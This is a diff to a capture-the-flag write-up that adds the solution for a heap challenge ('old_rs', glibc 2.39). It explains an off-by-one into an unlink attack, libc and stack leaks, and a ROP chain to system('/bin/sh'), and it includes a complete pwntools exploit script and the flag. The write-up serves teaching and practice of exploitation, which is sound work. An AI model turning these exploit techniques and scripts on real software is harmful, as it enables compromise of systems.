@@ -116,7 +116,9 @@ The `create_ticket` is eventually doing this:
 
 That is almost everything we need to step further, the key things to mention that program allocates only unsorted bin chunks (0x418) meaning that no fastbin chunks are used, and size is high enough to not use tcache. And there is only 1 free usage per execution, meaning that we can only free once in the program (we can increase this limit later, but its not needed, we can pwn using only 1 free). Also there is global chunks array (global_array), that contains pointers to chunks in heap and can be accessed via corresponding ticket number in the program. We limited for option usage in 13 execution, as i mentioned for free usage it can be increased later, but we do not need to do that becasue 13 options is enough to pwn this program.
 
-For the bugs there is no Use after Free or Double free bugs, and usage of calloc() also zeros the chunks preventing us from potential heap/libc leaks using the uninitalized memory, there it will not leak anything using calloc. There is single byte overflow in the `edit_ticket` allowing us to overflow next chunk's size field.
+As you can see there is no Use after Free or Double free bugs type bugs, because it checks the global_array at the index to be not zero and zeros it after the free() usage, and usage of calloc() also zeros the chunks preventing us from potential heap/libc leaks using the uninitalized memory, there it will not leak anything using calloc.
+
+But there is single byte overflow in the `edit_ticket` allowing us to overflow next chunk's size field. We will use this strong primitive to exploit our binary in the Exploitation part.
 
 Now we can write some wrapper python pwntools code to be able to easily communicate with the binary options:
 ```
@@ -149,21 +151,303 @@ p = gdb.debug([exe.path], '''continue''')
 
 p.interactive()
 ```
+I created this template using the behaviour of the functions, as you can see create_ticket not become malloc() and cancel_ticket eventually becomed free() in our template, others did not changed in the context.
+
+Lets dive into Exploitation part and see what we can achieve with single byte overflow in this program.
+
+### Exploitation Part 1
+
+Firstly lets check that bug exist dynamically, via executing the binary with our template and setup the overflow, it should overflow '1' chunk's size field:
+```
+from pwn import *
+
+def malloc(p, data):
+        p.sendlineafter(b'> ', b'1')
+        p.sendafter(b': ', data)
+
+def edit(p, index, data):
+        p.sendlineafter(b'> ', b'2')
+        p.sendlineafter(b': ', str(index).encode())
+        p.sendafter(b': ', data)
+
+def view(p, index):
+        p.sendlineafter(b'> ', b'3')
+        p.sendlineafter(b': ', str(index).encode())
+
+def free(p, index):
+        p.sendlineafter(b'> ', b'4')
+        p.sendlineafter(b': ', str(index).encode())
+
+exe = ELF('./old_rs')
+libc = exe.libc
+context.binary = exe
+context.gdb_binary = 'pwndbg'
+context.terminal = ["tmux", "splitw", "-h"]
+
+p = gdb.debug([exe.path], '''continue''')
+
+malloc(p, b'abc') # 0
+malloc(p, b'def') # 1
+malloc(p, b'123') # 2
+
+edit(p, 0, b'A' * 0x418 + b'\xff') # overflow next chunk's size field
+
+p.interactive()
+```
+
+Execute it and we can inspect the heap in pwndbg:
+![](heap_init_overflow.png)
+
+As you can see there is single byte overflow, which replaced first byte of the size field of next chunk by our last data '\xff'. Now we have Off By One primitive in the heap.
+
+We are dealing with unsorted bin chunks, which is using double linked list structure - containing fd (forward pointer) and bk (backward pointer). And we are limited in chunk allocation by 3 and free usage by 1, so what we can do? We can use Unsafe Unlink technique which can be exploited in that condition which we have now.
+
+Here is some theory:
+1. When chunk is removed from unsorted bin, and previous chunk is also freed, malloc will do unlink() on this chunk, which eventually does:
+  ```
+    FD = P->fd;
+    BK = P->bk;
+
+    FD->bk = BK;
+    BK->fd = FD;
+  ```
+It takes the Forward pointer (fd) of current chunk, replaces Backward pointer (bk) of it to the bk of current chunk. Then takes bk of current chunk, replaces fd of it to the fd of current chunk. Leading us arbitrary write if we control this pointers of unlinking chunk.
+
+But there is a twist. Since our binary is linked in GLIBC 2.39, there is malloc integrity check introduced way before, which checks our unlinking process to mitigate such attacks or make it harder to exploit.
+
+The check looks like this:
+  ```
+    assert(P->fd->bk == P);
+    assert(P->bk->fd == P)
+  ```
+Meaning it assumes and verifies that our chunks fd's bk is pointing to us, and our chunks bk's fd is also pointing to us, mitigating the initial arbitrary write ability, but we still can use this technique in certain situations which requires some additions in binary or how the program deals with chunks.
+2. To check if previous chunk is freed, malloc checks prev_in_use flag of the current chunk it accessing to, if its 0 then previous chunk is freed and unlink() can be called on this chunks.
+
+To make believe for malloc that previous chunk is freed and to forge using unlink on our current chunk, we just need to somehow null the prev_in_use bit which is LSB bit of size field (ex. 0x421 = prev_in_use=1, 0x420=prev_in_use=0)
+
+So now we have the idea of our exploitation, we can trigger unlink() on the chunk, if prev_in_use bit of current chunks is nulled, and we can basically get Arbitrary write by replacing the fd and bk pointers of the unlinking chunk, to arbritary location. But we need to deal with the security mitigation inside of GLIBC.
+
+Remember that our chunks are stored in the global array (we called it global_array) and since binary is No PIE we can have its address in memory:
+![](global_array.png)
+
+We can get use of that, since we know its address in runtime, we dont need any additional leaks in the first part of exploitation. The idea is to create fake chunk inside of the first chunk we allocate, to forge it to be valid for both fd and bk, pointing to global_array. Since unlink will check the corresponding fd and bk, we can craft such offset behind fd and bk so that it will point to our chunk, bypassing the integrity check:
+1. We allocate 3 chunks (third is to not deal with top chunk consolidation)
+2. We edit the first chunk and prepare our fake chunks inside, pointing to fd and bk to bypass double linked list check, and we overflow at the same time into thunk 2 replacing it's prev_in_use bit to be 0, by simply putting 0x20 (size of chunk 2 will become 0x420)
+3. Now we free chunk 2, since malloc sees prev_in_use is nulled, it will try to do unlink() in chunk 1, leading us to overwrite the first entry in the global_array to point itself, leading us the arbitrary write
+
+Here is addition, we need also to put valid prev_size field of the chunk 2, because malloc checks the prev_size for corruption and gets the offset based on that, also we need to put -0x10 prev_size on it since we want to point the prev_size into our actual fake chunk, we need to substract the 0x10 from it and place while we overflow
+
+So far our exploit with additional comments can be written as this:
+```
+from pwn import *
+
+def malloc(p, data):
+        p.sendlineafter(b'> ', b'1')
+        p.sendafter(b': ', data)
+
+def edit(p, index, data):
+        p.sendlineafter(b'> ', b'2')
+        p.sendlineafter(b': ', str(index).encode())
+        p.sendafter(b': ', data)
+
+def view(p, index):
+        p.sendlineafter(b'> ', b'3')
+        p.sendlineafter(b': ', str(index).encode())
+
+def free(p, index):
+        p.sendlineafter(b'> ', b'4')
+        p.sendlineafter(b': ', str(index).encode())
+
+exe = ELF('./old_rs')
+libc = exe.libc
+context.binary = exe
+context.gdb_binary = 'pwndbg'
+context.terminal = ["tmux", "splitw", "-h"]
+
+p = gdb.debug([exe.path], '''continue''')
+
+malloc(p, b'abc') # 1-st usage option, 0 chunk
+malloc(p, b'def') # 2-nd usage option, 1 chunk
+malloc(p, b'123') # 3-rd usage option, 2 chunk
+
+# 0x404050 - global_array
+fd = 0x404050 - 0x18 # we point to -0x18 (24) since we faking our chunk and the unlink check will follow our fd, and find the first entry of chunk which is chunk number 0
+bk = 0x404050 - 0x10 # same as fd, but +8 (since bk is 8 bytes after fd)
+prev_size = 0x410 # as mentioned, we fake our prev_size to -0x10 of actual prev_size 0x420 to point to our fake chunk start
+fake_size = 0x20 # overflow size, will become 0x420 in chunk number 1
+
+payload = b''
+payload += p64(0) # prev_size of previous chunk, we dont care for it
+payload += p64(0x410) # size of chunk we faking
+payload += p64(fd) + p64(bk) # fd and bk respectfully
+payload += p8(0) * (0x418 - 40) # fill up to prev_size
+payload += p64(prev_size) # faking prev_size to be 0x410
+payload += p8(fake_size) # overflowing chunk 1 to replace 0x421 to 0x420, and null prev_in_use bit
+
+edit(p, 0, payload) # 4-th usage option
+free(p, 1) # 5-th usage option, 1 free usage, triggers unlink on chunk 0
+
+p.interactive()
+```
+
+We can execute it and check the memory around global_array, it should replace first entry with itself - 0x18 (should be 0x404038):
+![](safe_unlink.png)
+
+And yes we successfully gained arbitrary write on the global_array and we can now fake any address to point inside of this array, and then by choosing the ticket number we can edit, read the data within this pointers.
+
+### Explotiation Part 2
+
+Now we have Arbitrary write on any address we provide inside of the global_array, which we control by editing the ticket (now it points to itself in ticket number 0, we can edit ticket and by the first entry we put our global_array address again, to persist the arbitary write primitive).
+
+Since we dont have any addresses leaked (stack, libc) and only have binary addresses, thanks to No PIE, we need some kind of Arbitrary Read. And of course if we can replace pointers in the global_array, we eventually have Arbitrary Read also, because we can review ticket which will give data inside of the address. Using that we can get our libc leak just by classic reading the puts GOT, i will add this step to exploit script:
+```
+edit(p, 0, p64(0) * 3 + p64(0x404050) + p64(exe.got.puts)) # 6 usage option
+view(p, 1) # 7 usage option, leaking libc
+
+p.recvuntil(b'===\n')
+
+puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
+libc.address = puts_leak - libc.sym.puts
+print(f"Libc leak: {hex(puts_leak)}")
+print(f"Libc address: {hex(libc.address)}")
+```
+
+Now we can leverage our Arbitrary Write in any form, there is no __free_hook or __malloc_hook's available since its GLIBC 2.39 and it not contains that, but we can do several RCE on this version of libc. I prefered to use ROP chain into the stack RIP. This requires stack leak, so lets get it by leaking libc environ symbol which contains stack addresses:
+```
+edit(p, 0, p64(0x404050) + p64(libc.sym.environ)) # 8 usage option
+view(p, 1) # 9 usage option
+
+p.recvuntil(b'===\n')
+
+environ = u64(p.recv(6).ljust(8, b'\x00'))
+stack = environ - 360 # stack until nearly our RIP
+print(f"Environ loc: {hex(environ)}")
+print(f"Stack: {hex(stack)}")
+```
+
+Then we can calculate the offset until our RIP to start overwriting it and edit global_array to finalize our attack, it can be done via debugging, simply put breakpoint and inspect the stack nearly behind returning from the function, and compare with our stack leak:
+```
+edit(p, 0, p64(0x404050) + p64(stack + 24)) # 10 usage option
+```
+
+And whats left is just perform ROP chain by simply doing pop rdi for binsh address and jumping to system (not forged to use ret_gadget, there will be movabs issue inside of system, which is stack allignment issue that can be solved via simply retting):
+```
+pop_rdi_ret = libc.address + 0x000000000010f78b
+bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
+ret_gadget = libc.address + 0x000000000002882f
+
+payload = flat(
+        pop_rdi_ret,
+        bin_sh_addr,
+        ret_gadget,
+        libc.sym.system
+)
+edit(p, 1, payload) # 11 usage option, final RCE, will overwrite RIP with our ROP chain and give us shell
+```
+
+After that we will have shell, and we can read the flag
 
 ## Flag
 
-`f13{}`
+`f13{0ld_but_g0ld_s4f3_unl1nk_is_just_b4ck_t0_2000s}`
+
+## Full Exploit Script
+
+```
+from pwn import *
+
+def malloc(p, data):
+        p.sendlineafter(b'> ', b'1')
+        p.sendafter(b': ', data)
+
+def edit(p, index, data):
+        p.sendlineafter(b'> ', b'2')
+        p.sendlineafter(b': ', str(index).encode())
+        p.sendafter(b': ', data)
+
+def view(p, index):
+        p.sendlineafter(b'> ', b'3')
+        p.sendlineafter(b': ', str(index).encode())
+
+def free(p, index):
+        p.sendlineafter(b'> ', b'4')
+        p.sendlineafter(b': ', str(index).encode())
+
+exe = ELF('./old_rs')
+libc = exe.libc
+context.binary = exe
+context.gdb_binary = 'pwndbg'
+context.terminal = ["tmux", "splitw", "-h"]
+
+p = gdb.debug([exe.path], '''continue''')
+
+malloc(p, b'abc') # 1-st usage option, 0 chunk
+malloc(p, b'def') # 2-nd usage option, 1 chunk
+malloc(p, b'123') # 3-rd usage option, 2 chunk
+
+# 0x404050 - global_array
+fd = 0x404050 - 0x18 # we point to -0x18 (24) since we faking our chunk and the unlink check will follow our fd, and find the first entry of chunk which is chunk number 0
+bk = 0x404050 - 0x10 # same as fd, but +8 (since bk is 8 bytes after fd)
+prev_size = 0x410 # as mentioned, we fake our prev_size to -0x10 of actual prev_size 0x420 to point to our fake chunk start
+fake_size = 0x20 # overflow size, will become 0x420 in chunk number 1
+
+payload = b''
+payload += p64(0) # prev_size of previous chunk, we dont care for it
+payload += p64(0x410) # size of chunk we faking
+payload += p64(fd) + p64(bk) # fd and bk respectfully
+payload += p8(0) * (0x418 - 40) # fill up to prev_size
+payload += p64(prev_size) # faking prev_size to be 0x410
+payload += p8(fake_size) # overflowing chunk 1 to replace 0x421 to 0x420, and null prev_in_use bit
+
+edit(p, 0, payload) # 4-th usage option
+free(p, 1) # 5-th usage option, 1 free usage, triggers unlink on chunk 0
+
+edit(p, 0, p64(0) * 3 + p64(0x404050) + p64(exe.got.puts)) # 6 usage option
+view(p, 1) # 7 usage option, leaking libc
+
+p.recvuntil(b'===\n')
+
+puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
+libc.address = puts_leak - libc.sym.puts
+print(f"Libc leak: {hex(puts_leak)}")
+print(f"Libc address: {hex(libc.address)}")
+
+edit(p, 0, p64(0x404050) + p64(libc.sym.environ)) # 8 usage option
+view(p, 1) # 9 usage option
+
+p.recvuntil(b'===\n')
+
+environ = u64(p.recv(6).ljust(8, b'\x00'))
+stack = environ - 360 # stack until nearly our RIP
+print(f"Environ loc: {hex(environ)}")
+print(f"Stack: {hex(stack)}")
+
+edit(p, 0, p64(0x404050) + p64(stack + 24)) # 10 usage option
+
+pop_rdi_ret = libc.address + 0x000000000010f78b
+bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
+ret_gadget = libc.address + 0x000000000002882f
+
+payload = flat(
+        pop_rdi_ret,
+        bin_sh_addr,
+        ret_gadget,
+        libc.sym.system
+)
+edit(p, 1, payload) # 11 usage option, final RCE, will overwrite RIP with our ROP chain and give us shell
+
+p.interactive()
+```
 
 ## key takeaways
 
-- Learning point 1
-- Learning point 2
-- Learning point 3
+- Understand binary behaviour
+- Identify vulnerability - Off by One in the heap
+- Bypass Unsafe Unlink security mitigations and perform Safe Unlink :)
 
 ## References
 
-- [Unsafe Unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/unsafe_unlink.c)
-
+- [Unsafe Unlink in more details](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/unsafe_unlink.c)
 
 # 2. MAX MAX
 
